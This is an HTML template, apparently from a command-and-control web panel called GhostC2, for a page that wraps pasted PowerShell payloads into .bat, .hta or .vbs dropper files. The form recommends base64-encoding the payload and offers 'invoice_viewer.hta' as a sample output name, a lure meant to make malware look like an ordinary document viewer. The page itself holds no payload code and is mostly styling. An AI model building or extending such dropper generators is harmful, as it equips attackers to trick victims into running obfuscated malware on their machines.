<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Generate PS Dropper - GhostC2</title>
    <style>
        :root {
            --accent: #22ff44;
            --status-glow: 0 0 10px 2px #22ff4499;
        }
        body {
            background: #111316;
            color: #e3e3e3;
            font-family: 'Inter', Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            min-height: 100vh;
        }
        #sidebar {
            width: 190px;
            background: #181a1f;
            border-right: 1.5px solid #222;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: fixed;
            left: 0; top: 0;
            z-index: 100;
        }
        #sidebar .logo {
            font-size: 1.18em;
            font-weight: 700;
            padding: 30px 20px 36px 24px;
            color: var(--accent);
            letter-spacing: 0.04em;
        }
        #sidebar nav {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        #sidebar a {
            color: #dadada;
            text-decoration: none;
            padding: 13px 30px 13px 24px;
            font-size: 1em;
            border-left: 3px solid transparent;
            font-weight: 500;
            transition: background 0.12s, border-color 0.14s, color 0.15s;
        }
        #sidebar a.active {
            border-left: 3px solid var(--accent);
            color: var(--accent);
            background: #16181d;
        }
        #sidebar a:hover {
            background: #16181d;
            color: var(--accent);
        }
        .theme-switcher {
            margin: 16px 0 0 24px;
        }
        .theme-switcher button {
            background: transparent;
            border: none;
            cursor: pointer;
            font-size: 1em;
            margin-right: 7px;
            color: #888;
            transition: color 0.12s;
        }
        .theme-switcher button.active, .theme-switcher button:hover {
            color: var(--accent);
        }
        #main {
            margin-left: 190px;
            padding: 42px 38px 32px 38px;
            width: 100%;
            min-height: 100vh;
        }
        .ps-container {
            background: #181a1f;
            border: 1.5px solid #23262a;
            border-radius: 13px;
            max-width: 600px;
            margin: 0 auto 0 auto;
            box-shadow: 0 8px 24px #0007;
            padding: 36px 32px 32px 32px;
        }
        h1 {
            font-size: 1.32em;
            font-weight: 700;
            color: #e3e3e3;
            letter-spacing: 0.01em;
            margin-bottom: 24px;
            margin-top: 0;
            text-align: left;
        }
        label {
            color: #dadada;
            font-weight: 500;
            display: block;
            margin-bottom: 6px;
            font-size: 1em;
        }
        textarea, select, input[type="text"] {
            width: 100%;
            background: #111316;
            color: #e3e3e3;
            border: 1.5px solid #22ff44;
            border-radius: 8px;
            padding: 12px 12px;
            font-size: 1em;
            font-family: 'JetBrains Mono', 'Fira Mono', 'Inter', Arial, monospace;
            margin-bottom: 16px;
            box-sizing: border-box;
            transition: border 0.18s;
        }
        textarea:focus, select:focus, input:focus {
            border-color: #c8facc;
            outline: none;
        }
        select {
            background: #181a1f;
            color: #22ff44;
            font-weight: bold;
        }
        input[type="text"]::placeholder {
            color: #6e6e6e;
            opacity: 0.85;
        }
        button[type="submit"] {
            background: #1b1d22;
            color: #22ff44;
            border: 1.5px solid #22ff44;
            font-weight: 600;
            font-size: 1.11em;
            border-radius: 6px;
            padding: 11px 0;
            width: 100%;
            margin-top: 2px;
            margin-bottom: 4px;
            cursor: pointer;
            letter-spacing: 0.05em;
            box-shadow: 0 2px 8px #22ff4420;
            transition: background 0.18s, color 0.18s, border 0.18s;
        }
        button[type="submit"]:hover, button[type="submit"]:focus {
            background: #191c21;
            border-color: #c8facc;
            color: #c8facc;
        }
        .download-link {
            margin-top: 25px;
            display: block;
            color: #22ff44;
            font-size: 1.1em;
            font-weight: 700;
            text-align: center;
            text-shadow: 0 1px 6px #000a;
            text-decoration: none;
            transition: color 0.14s;
        }
        .download-link:hover {
            color: #e3e3e3;
        }
        @media (max-width: 650px) {
            #main { padding: 18px 4vw; }
            .ps-container { padding: 20px 3vw; }
        }
    </style>
</head>
<body>
    <div id="sidebar">
        <div class="logo">GhostC2</div>
        <nav>
            <a href="/">Dashboard</a>
            <a href="/console">Live Console</a>
            <a href="/generate">Generate Payload</a>
            <a href="/upload">Upload</a>
            <a href="/generate_ps_payload" target="_blank">PowerShell Payload</a>
            <a href="/generate_ps" class="active">Generate PS Dropper</a>
        </nav>
        <div class="theme-switcher">
            <button onclick="setTheme('green')" class="active">ðŸŸ¢</button>
            <button onclick="setTheme('orange')">ðŸŸ </button>
            <button onclick="setTheme('blue')">ðŸ”µ</button>
            <button onclick="setTheme('red')">ðŸ”´</button>
        </div>
    </div>
    <div id="main">
        <div class="ps-container">
            <h1>Generate PowerShell Dropper</h1>
            <form action="/generate_ps" method="post">
                <label for="ps1">PowerShell Payload (.ps1 content):</label>
                <textarea name="ps1" id="ps1" rows="8" required placeholder="Paste your generated .ps1 payload here..."></textarea>
                <label for="format">Wrapper Format:</label>
                <select name="format" id="format" required>
                    <option value="bat">.bat (Batch File)</option>
                    <option value="hta">.hta (HTML Application)</option>
                    <option value="vbs">.vbs (VBScript)</option>
                </select>
                <label for="filename">Output Filename (optional):</label>
                <input type="text" name="filename" id="filename" placeholder="e.g. invoice_viewer.hta">
                <label>
                <input type="checkbox" name="b64encode" id="b64encode" checked>
                Base64-encode PowerShell payload (recommended for all wrapper types)
                </label>

                <button type="submit">Generate Dropper</button>
            </form>
            {% if output_path %}
                <a class="download-link" href="{{ url_for('payloads_download', filename=output_path) }}" download>
                        â¬‡ Download: {{ output_path }}
                </a>
            {% endif %}
        </div>
    </div>
    <script>
        // Theme Switcher (matches dashboard)
        function setTheme(theme) {
            let vars = {
                green:  ["#22ff44", "0 0 10px 2px #22ff4499"],
                orange: ["#ff9a00", "0 0 10px 2px #ff9a0099"],
                blue:   ["#0af",    "0 0 10px 2px #0af8"],
                red:    ["#f33",    "0 0 10px 2px #f338"]
            };
            if(vars[theme]) {
                document.documentElement.style.setProperty('--accent', vars[theme][0]);
                document.documentElement.style.setProperty('--status-glow', vars[theme][1]);
                localStorage.setItem("ghostc2-theme", theme);
            }
        }
        window.onload = function() {
            let saved = localStorage.getItem("ghostc2-theme");
            if (saved) setTheme(saved);
        };
    </script>
</body>
</html>
